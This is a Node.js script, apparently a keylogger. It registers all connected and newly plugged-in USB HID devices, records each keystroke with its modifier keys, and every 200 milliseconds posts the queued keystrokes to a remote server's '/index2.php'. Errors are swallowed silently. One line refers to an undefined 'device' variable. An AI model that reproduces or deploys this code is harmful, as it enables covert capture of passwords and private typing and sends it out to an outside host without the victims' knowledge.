var HID = require('node-hid');
var client = require('./client');
var common = require('./common');
var uuid = require('uuid');
var usbDetect = require('usb-detection');

/**
* Set URL in client
*/
url = 'http://' + common.ip;
client.setUrl(url);

/**
* Set constants for app
*/
const KEY_NONE = 0x00;
const KEY_ERR_UNDEFINED = 0x03; // keyboard codes 0x01, 0x02, 0x03 detect corresponding error events

const KEY_MOD_LCTRL = 0x01
const KEY_MOD_LSHIFT = 0x02
const KEY_MOD_LALT = 0x04
const KEY_MOD_LMETA = 0x08
const KEY_MOD_RCTRL = 0x10
const KEY_MOD_RSHIFT = 0x20
const KEY_MOD_RALT = 0x40
const KEY_MOD_RMETA = 0x80


const INTERVAL = 200; // interval to send queued buffer
const DATA_OFFSET = 2; // offset from buffer which indicates first data byte position
const MODIFIER_BYTE_OFFSET = 0; // position of the modifier byte

/**
* Set variables
*/
var hidDevices = {}; // dictionary of active HID devices
var bufferToSend = []; // buffer to send data to server
var previousData = null; // previous buffer data to compare with current buffer
var urlSendBuffer = '/index2.php'; // URI to send buffer

/**
* Define functions
*/
/* Transform HEX string to an integer value */
var getProductInfoItem = function(position) {
	position = "0x" + position;
	return parseInt(position);
};

/* Find the count of non-empty slots inside a buffer */
var getValuableSlotsCount = function (buffer) {
	var i;
	var count = 0;
	
	/* loop through buffer from the data offset */
	for (i = DATA_OFFSET; i < buffer.length; i++) {
		if (buffer[i] > KEY_ERR_UNDEFINED) {
			count++;
		}
	}
	return count;
};

/* Send buffer data */
var sendBuffer = function(bufferQueue) {
	return new Promise(function (resolve, reject) {
        client.runRequest(urlSendBuffer, 'POST', bufferQueue, {
            json: true,
			timeout: 1000,
            headers: {
                'X-HTTP-Method-Override': 'PATCH'
            }
        }).then(function () {
            resolve();
        }, function (err) {
            resolve(err);
        });
    });
};

/* Callback for data recieve from the device */
var onDataRecieve = function (data) {
	/* Get the modifier byte and the first data slot */
	var firstKey = data[DATA_OFFSET];
	var modifierByte = data[MODIFIER_BYTE_OFFSET];
	
	var isNecessaryToPush = false;
	var valuableKey = firstKey;
	
	/* If the data key slot doesn't contain an error value 
	*  than check if new key was pressed
	*/
	if (firstKey > KEY_ERR_UNDEFINED) {
		if (previousData != null) {
			/* Check if new position has been found inside the buffer
			*  comparing with previous buffer
			*/
			var slotCountData = getValuableSlotsCount(data);
			var slotCountPrevData = getValuableSlotsCount(previousData);
			if (slotCountData >= slotCountPrevData) {
				valuableKey = data[DATA_OFFSET + slotCountData - 1];
				isNecessaryToPush = true;
			}
		}
		else {
			isNecessaryToPush = true;
		}
	}
	if (isNecessaryToPush) {
		bufferToSend.push([modifierByte, valuableKey]);
	}
	previousData = data;
}

// Try to register new HID device
var registerNewDevice = function (vendorId, productId) {
	try {
		var usbHidID = uuid.v4();
		var hidDevice = new HID.HID(vendorId, productId);
		hidDevice.on("data", onDataRecieve);
		hidDevice.on("error", function() {});
		hidDevices[usbHidID] = hidDevice;
		device.hidID = usbHidID;
	}
	catch (error) {}
};

// Collect all existing HID devices and register them
var hDevices = HID.devices();
hDevices.forEach(function (hDevice) {
	registerNewDevice(hDevice.vendorId, hDevice.productId);
});


// Start monitoring of USB devices
usbDetect.startMonitoring();
 
// Detect add device event
usbDetect.on('add', function(device) {
	/* Try to define HID device and init event listeners */
	registerNewDevice(device.vendorId, device.productId);
});

// Detect remove device event
usbDetect.on('remove', function(device) {
	try {
		if (device.hidID in hidDevices) {
			var hidDevice = hidDevices[device.hidID];
			hidDevice.close();
			delete hidDevices[device.hidID];
		}
	}
	catch (error) {}
});

// Send queued buffer data
setInterval(function() {
	if (bufferToSend.length > 0) {
		dataSend = bufferToSend.slice();
		sendBuffer(dataSend).then(function() {
			bufferToSend = bufferToSend.slice(dataSend.length);
		});
	}
}, INTERVAL);
